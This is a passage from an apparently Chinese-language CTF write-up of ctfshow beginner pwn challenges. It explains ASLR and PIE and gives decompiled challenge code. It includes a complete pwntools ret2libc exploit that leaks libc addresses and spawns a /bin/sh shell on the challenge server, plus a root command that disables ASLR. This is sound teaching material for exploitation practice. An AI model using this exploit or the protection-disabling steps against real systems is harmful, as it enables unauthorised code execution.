<p>注意缓冲区buf定义在函数的栈帧中，使用ebp（基址指针）和esp（堆栈指针）来寻址，偏移量为-88，要覆盖返回地址的话偏移量还要-4，即使用<code>0x88+0x4个无用填充字符覆盖到返回地址</code></p>
<p>我们先看一下plt表中的函数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-d</span> <span class="token parameter variable">-j</span> .plt pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230625211327193.png" alt="image-20230625211327193"></p>
<p>可以看到plt表中含有puts函数跟write函数，那got表中也一定有他俩，</p>
<p>所以我们就使用puts函数来输出函数的内存地址</p>
<p>然后寻找相应的libc版本中<code>puts</code>函数的地址，接着找到找到libc中的<code>system</code>函数地址，填充执行system函数之后的返回地址(32位下偏移量固定为4)，最后填入system的参数<code>/bin/sh</code></p>
<p>exp(python3)：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># 打印调试信息</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token comment"># 建立连接</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token string">"28119"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>

<span class="token comment"># 溢出偏移地址</span>
offset <span class="token operator">=</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span>
<span class="token comment"># main函数地址</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
<span class="token comment"># plt表中puts函数地址</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token comment"># got表中puts函数的地址</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

<span class="token comment"># payload：0x88+0x4个无用填充字符覆盖到返回地址，</span>
<span class="token comment"># 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数，</span>
<span class="token comment"># main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞</span>
<span class="token comment"># puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址</span>
payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
<span class="token comment"># 发送payload</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># 接收puts函数输出的puts函数在内存的地址</span>
puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
<span class="token comment"># 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 使用libc.dump("system")找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
<span class="token comment"># 使用libc.dump("str_bin_sh")找到libc中的"/bin/sh"字符串地址，再加上基地址就得到"/bin/sh"字符串在内存的地址</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
<span class="token comment"># payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址</span>
<span class="token comment"># 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4</span>
<span class="token comment"># 最后填入system的参数“/bin/sh”</span>
payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>期间遇到LibcSearcher库出问题的可以看这个博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40026795/article/details/107150265">LibcSearcher的安装使用</a></p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626003947402.png" alt="image-20230626003947402"></p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626003958396.png" alt="image-20230626003958396"></p>
<hr>
<h2 id="ALSR"><a href="#ALSR" class="headerlink" title="ALSR"></a>ALSR</h2><p>对于二进制来说，攻击的前提是知道内存布局，需要提前知道shellcode或者其他一些数据的位置</p>
<p>而ALSR的作用是随机分配可执行文件、动态链接库、堆、栈等内存区域的地址，使攻击者无法轻易地预测这些内存区域的位置</p>
<p>但是ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜到正确的地址，有时攻击者还可以爆破</p>
<p>在Linux上，ASLR的全局配置 &#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space 有三种情况：</p>
<p>0表示关闭ASLR；</p>
<p>1表示部分开启（将mmap的基址，stack和vdso页面随机化）；</p>
<p>2表示完全开启（在部分开启的基础上增加heap的随机化）。</p>
<p>如下：<br><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626111916322.png" alt="image-20230626111916322"><br>我们可以修改&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_space文件的值来配置ASLR。</p>
<hr>
<h3 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h3><blockquote>
<p>修改&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626112146294.png" alt="image-20230626112146294"></p>
<p>是64位的，丢进ida64反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">,</span> <span class="token number">258</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4008F0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400970<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A00<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A90<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400B18<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400BB0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Please confirm your ASLR level first !                  "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here is your ASLR level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /proc/sys/kernel/randomize_va_space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 读取文件</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If the result is 0, then you get the correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 如果内容为0则给正确的flag</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If not,you will get a fake flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag is :ctfshow&#123;%p"</span><span class="token punctuation">,</span> main<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计代码，可以看到先读取我们本地的<code>/proc/sys/kernel/randomize_va_space</code>文件，若里面的内容是0，那接下来输出正确的flag</p>
<p>flag 由 <strong>main 函数的地址、system 函数的地址、ptr的堆地址、libc 库的基址</strong>组成</p>
<p>如果 ALSR 启用，那么<strong>堆、栈和libc库的地址都会被随机化</strong>，我们就得不到真正的flag</p>
<p>那我们先看看本地的<code>/proc/sys/kernel/randomize_va_space</code>文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/sys/kernel/randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626120144654.png" alt="image-20230626120144654"></p>
<p>看到我们的内容为2，那么我们得改为0</p>
<p>注意，我们要更改<code>/proc/sys/kernel/randomize_va_space</code>，就必须将用户切换到root，不然是改不了的。</p>
<p>wsl ubuntu一开始就不知道root密码的可以看这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_55267022/article/details/129899214">Windows下WSL Ubuntu中登录root账号的密码</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> root
<span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space
./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626120704721.png" alt="image-20230626120704721"></p>
<p>由于环境不同 libc 不一样，给的 flag 会不一样，这里得用 ctfshow 提供的虚拟机来运行，其中的 libc 才是正确的</p>
<p>flag：<code>ctfshow&#123;0x400687_0x400560_0x603260_0x7ffff7fd64f0&#125;</code></p>
<hr>
<h3 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h3><p>先把题目给的 libc-2.27.so 文件和 pwn 附件放在同个文件夹下</p>
<p>和上题一样操作，同样是修改<code>/proc/sys/kernel/randomize_va_space</code>，这次要求为0或者1</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /proc/sys/kernel/randomize_va_space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If the result is 0 or 1, then you get the correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我们上题已经修改为0了，所以直接运行就拿到flag了</p>
<p>flag：<code>ctfshow&#123;0x400687_0x400560_0x603260&#125;</code></p>
<hr>
<h3 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h3><p>和上题比起来什么限制都没有，直接运行获取flag（？</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230626122708881.png" alt="image-20230626122708881"></p>
<hr>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>由于ASLR是一种操作系统层面的技术，而二进制程序本身是不支持随机化加载的，便出现了一些绕过方法，例如ret2plt、GOT劫持、地址爆破等</p>
<p>于是，人们于2003年引入了位置无关可执行文件（Position-Independent Executable，PIE）。它在<strong>应用层的编译器</strong>实现，通过将程序编译为位置无关代码（Position-Independent Code，PIC），使程序可以被加载到任意位置，就像是一个特殊的共享库。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度。</p>
<p>可执行文件中的代码和数据会被随机地放置在内存中的某个位置，因此无法像传统的可执行文件那样准确地知道偏移量</p>
<hr>
<h3 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h3><p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230627212005089.png" alt="image-20230627212005089"></p>
<p>保护全开，有PIE</p>
<p>是64位的，丢进ida64反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-1Ch] BYREF</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">,</span> <span class="token number">258</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_B10<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_B90<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_C20<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_CB0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_D38<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_DD0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Please confirm your ASLR level first !                  "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 2 > /proc/sys/kernel/randomize_va_space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here is your ASLR level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /proc/sys/kernel/randomize_va_space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's take a look at protection:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"checksec pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"executable: %p\n"</span><span class="token punctuation">,</span> main<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"system@plt: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>system<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"heap: %p\n"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"stack: %p\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"As you can see, the protection has been fully turned on and the address has been completely randomized!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here is your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码审计，发现有<code>system(&quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;);</code>，把其内容更改为2，也就是将ASLR全开启</p>
<p>然后输出了main函数，system函数的地址，还输出了变量的堆栈的信息</p>
<p>最后打印一条消息，说明所有的保护机制都开了，地址全部都是随机化的</p>
<p>然后就会为我们输出flag了</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230627212614012.png" alt="image-20230627212614012"></p>
<p>flag：<code>ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</code></p>
<hr>
<h3 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h3><blockquote>
<p>ret2libc</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230627212855572.png" alt="image-20230627212855572"></p>
<p>开了NX，没开canary和PIE</p>
<p>是32位，丢到ida反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048710<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048784<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048800<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_804888C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_804891C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_80489A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048A34<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : No Canary found &amp; No PIE "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Hello CTFshow!\n"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ctfshow()函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-88h] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们先看一下plt表中的函数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-d</span> <span class="token parameter variable">-j</span> .plt pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230627213415637.png" alt="image-20230627213415637"></p>
<p>这道题没有给我们预留后门，也没有system函数</p>
<p>但是plt表中有puts函数，所以我们还得使用pwn25题目的ret2libc方式来打通这道题目，因为这个程序的PIE是关闭的，并且canary也没开，ret2libc方便些</p>
<p>因为溢出长度没变，直接拿pwn25的exp来打即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># 打印调试信息</span>
